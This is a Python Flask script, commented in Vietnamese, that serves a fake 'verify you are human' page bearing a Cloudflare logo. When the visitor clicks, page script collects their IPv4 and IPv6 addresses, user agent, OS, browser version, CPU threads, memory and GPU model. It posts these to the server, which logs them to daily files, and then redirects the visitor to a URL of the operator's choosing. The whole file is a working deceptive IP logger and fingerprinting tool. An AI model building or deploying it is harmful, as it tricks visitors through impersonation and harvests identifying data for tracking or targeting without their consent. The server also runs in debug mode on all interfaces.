from flask import Flask, request, render_template_string
from datetime import datetime
import os

app = Flask(__name__)

# Nhập URL chuyển hướng từ CMD (nếu để trống, mặc định Rickroll)
redirect_url = input("Nhập URL chuyển hướng (enter để Rickroll): ").strip()
if not redirect_url:
    redirect_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

# Tạo thư mục lưu file log nếu chưa tồn tại
log_folder = "logs"
if not os.path.exists(log_folder):
    os.makedirs(log_folder)

os.system("clear")

HTML_PAGE = f"""
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Xác minh bạn là con người</title>
  <!-- Import Bootstrap CSS để tạo giao diện đẹp hơn -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <style>
    body {{
      background: linear-gradient(135deg, #74ABE2, #5563DE);
      color: #fff;
      font-family: 'Roboto', sans-serif;
      min-height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }}
    .container {{
      text-align: center;
    }}
    .logo {{
      margin-bottom: 30px;
    }}
    .logo img {{
      max-width: 150px;
    }}
    .btn-custom {{
      background-color: #0077ff;
      border: none;
      border-radius: 8px;
      padding: 12px 20px;
      font-size: 18px;
      color: #fff;
      width: 200px;
      transition: background-color 0.3s ease;
      cursor: pointer;
    }}
    .btn-custom:hover {{
      background-color: #005ce6;
    }}
    .ip-display {{
      margin-top: 15px;
      font-size: 16px;
      color: #ccc;
    }}
  </style>
  <script>
    async function fetchIP(url) {{
      try {{
        let response = await fetch(url);
        let data = await response.json();
        return data.ip;
      }} catch (error) {{
        console.error("Lỗi khi lấy địa chỉ IP:", error);
        return "Không xác định";
      }}
    }}

    async function verifyAndContinue() {{
      // Thu thập thông tin hệ thống
      const platformInfo = navigator.platform || "Không xác định";
      const userAgent = navigator.userAgent || "Không xác định";
      const cpuThreads = navigator.hardwareConcurrency || "Không xác định";
      const deviceMemory = navigator.deviceMemory || "Không xác định";
      
      let gpuInfo = "Không xác định";
      try {{
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {{
          const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
          if (debugInfo) {{
            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          }}
        }}
      }} catch (e) {{
        console.error("Lỗi khi lấy thông tin GPU:", e);
      }}
      
      const ipv4 = await fetchIP("https://api.ipify.org?format=json");
      const ipv6 = await fetchIP("https://api64.ipify.org?format=json");

      // Hiển thị IP phát hiện trên giao diện
      document.getElementById("ipDisplay").innerText = "IP phát hiện: " + ipv4;
      
      // Gửi thông tin đến server để log
      fetch("/collect", {{
        method: "POST",
        headers: {{ "Content-Type": "application/json" }},
        body: JSON.stringify({{
          platform: platformInfo,
          userAgent: userAgent,
          cpuThreads: cpuThreads,
          deviceMemory: deviceMemory,
          gpuInfo: gpuInfo,
          ipv4: ipv4,
          ipv6: ipv6
        }})
      }});
      
      // Chuyển hướng tới URL chuyển hướng
      window.location.href = "{redirect_url}";
    }}
  </script>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://i.ibb.co/Zz1Sp8rL/Cloudflare-Logo.png" alt="Logo" class="img-fluid">
    </div>
    <button class="btn-custom" onclick="verifyAndContinue()">Tiếp tục</button>
    <div id="ipDisplay" class="ip-display"></div>
  </div>
  <!-- Import Bootstrap JS (optional) -->
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    platform_info = data.get("platform", "Không xác định")
    user_agent = data.get("userAgent", "Không xác định")
    cpu_threads = data.get("cpuThreads", "Không xác định")
    device_memory = data.get("deviceMemory", "Không xác định")
    gpu_info = data.get("gpuInfo", "Không xác định")
    ipv4 = data.get("ipv4", "Không xác định")
    ipv6 = data.get("ipv6", "Không xác định")
    
    # Xác định hệ điều hành (desktop & mobile)
    os_info = "Không xác định"
    os_version = "Không xác định"
    if "Android" in user_agent:
        os_info = "Android"
        try:
            os_version = user_agent.split("Android ")[1].split(";")[0].strip()
        except:
            os_version = "Không xác định"
    elif "iPhone" in user_agent or "iPad" in user_agent:
        os_info = "iOS"
        try:
            os_version = user_agent.split("OS ")[1].split(" ")[0].replace("_", ".")
        except:
            os_version = "Không xác định"
    elif "Windows NT 10.0; Win64; x64" in user_agent:
        os_info = "Windows"
        os_version = "11"
    elif "Windows NT 10.0" in user_agent:
        os_info = "Windows"
        os_version = "10"
    elif "Windows NT 6.1" in user_agent:
        os_info = "Windows"
        os_version = "7"
    elif "Mac OS X" in user_agent:
        os_info = "Mac OS X"
        try:
            os_version = user_agent.split("Mac OS X ")[1].split(")")[0]
        except:
            os_version = "Không xác định"
    elif "Linux" in user_agent:
        os_info = "Linux"
        os_version = "Không xác định"
    
    # Nhận diện trình duyệt và trích xuất phiên bản
    browser_info = "Không xác định"
    version_info = "Không xác định"
    user_agent_lower = user_agent.lower()
    if "edg/" in user_agent_lower:
        browser_info = "Microsoft Edge"
    elif "coccoc" in user_agent_lower:
        browser_info = "Cốc Cốc"
    elif "vivaldi" in user_agent_lower:
        browser_info = "Vivaldi"
    elif "brave" in user_agent_lower:
        browser_info = "Brave"
    elif "ucbrowser" in user_agent_lower:
        browser_info = "UC Browser"
    elif "samsungbrowser" in user_agent_lower:
        browser_info = "Samsung Internet"
    elif "opera" in user_agent_lower or "opr" in user_agent_lower:
        browser_info = "Opera"
    elif "chrome" in user_agent_lower and "safari" in user_agent_lower:
        browser_info = "Google Chrome"
    elif "firefox" in user_agent_lower:
        browser_info = "Mozilla Firefox"
    elif "safari" in user_agent_lower and "chrome" not in user_agent_lower:
        browser_info = "Safari"
    elif "msie" in user_agent_lower or "trident" in user_agent_lower:
        browser_info = "Internet Explorer"
    
    try:
        if browser_info == "Microsoft Edge":
            version_info = user_agent.split("Edg/")[1].split(" ")[0]
        elif browser_info == "Cốc Cốc":
            version_info = user_agent.split("CocCocBrowser/")[1].split(" ")[0]
        elif browser_info == "Vivaldi":
            version_info = user_agent.split("Vivaldi/")[1].split(" ")[0]
        elif browser_info == "Brave":
            version_info = user_agent.split("Chrome/")[1].split(" ")[0]
        elif browser_info == "UC Browser":
            version_info = user_agent.split("UCBrowser/")[1].split(" ")[0]
        elif browser_info == "Samsung Internet":
            version_info = user_agent.split("SamsungBrowser/")[1].split(" ")[0]
        elif browser_info == "Opera":
            version_info = user_agent.split("OPR/")[1].split(" ")[0]
        elif browser_info == "Google Chrome":
            version_info = user_agent.split("Chrome/")[1].split(" ")[0]
        elif browser_info == "Mozilla Firefox":
            version_info = user_agent.split("Firefox/")[1].split(" ")[0]
        elif browser_info == "Safari":
            version_info = user_agent.split("Version/")[1].split(" ")[0]
        elif browser_info == "Internet Explorer":
            if "rv:" in user_agent:
                version_info = user_agent.split("rv:")[1].split(")")[0]
            else:
                version_info = user_agent.split("MSIE ")[1].split(";")[0]
    except:
        version_info = "Không xác định"
    
    # Tạo nội dung log và lưu vào file .txt (tên file theo ngày, trong thư mục logs)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    filename = os.path.join("logs", datetime.now().strftime("%Y-%m-%d") + ".txt")
    log_data = f"""[{timestamp}]
Hệ điều hành: {os_info} {os_version}
Browser: {browser_info}/{version_info}
Platform: {platform_info}
CPU Threads: {cpu_threads}
RAM: {device_memory} GB
GPU: {gpu_info}
IPv4: {ipv4}
IPv6: {ipv6}
-------------------------
"""
    with open(filename, "a", encoding="utf-8") as f:
        f.write(log_data)
    
    # In log ra console với màu đen (sử dụng ANSI escape code \033[30m)
    print("\033[30m[🔍] Hệ điều hành: {} {}\033[0m".format(os_info, os_version))
    print("\033[30m[🌐] Browser: {}/{}\033[0m".format(browser_info, version_info))
    print("\033[30m[💻] Platform: {}\033[0m".format(platform_info))
    print("\033[30m[⚙️] CPU Threads: {}\033[0m".format(cpu_threads))
    print("\033[30m[🧠] RAM: {} GB\033[0m".format(device_memory))
    print("\033[30m[🎮] GPU: {}\033[0m".format(gpu_info))
    print("\033[30m[📡] IPv4: {}\033[0m".format(ipv4))
    print("\033[30m[📶] IPv6: {}\033[0m".format(ipv6))
    
    if ipv4 != "Không xác định":
        print("\033[30m[✳️] Thiết bị kết nối với IP: {}\033[0m".format(ipv4))
    
    return "", 204

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True, use_reloader=False)